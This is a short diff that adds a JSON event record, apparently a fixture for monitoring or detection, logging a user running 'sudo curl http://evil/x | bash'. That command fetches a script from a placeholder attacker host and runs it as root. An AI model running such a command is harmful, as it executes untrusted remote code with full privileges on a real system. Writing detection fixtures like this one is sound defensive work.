@@ -1,0 +1,5 @@
+{
+  "process": "sudo",
+  "user": "alice",
+  "command_line": "sudo curl http://evil/x | bash"
+}
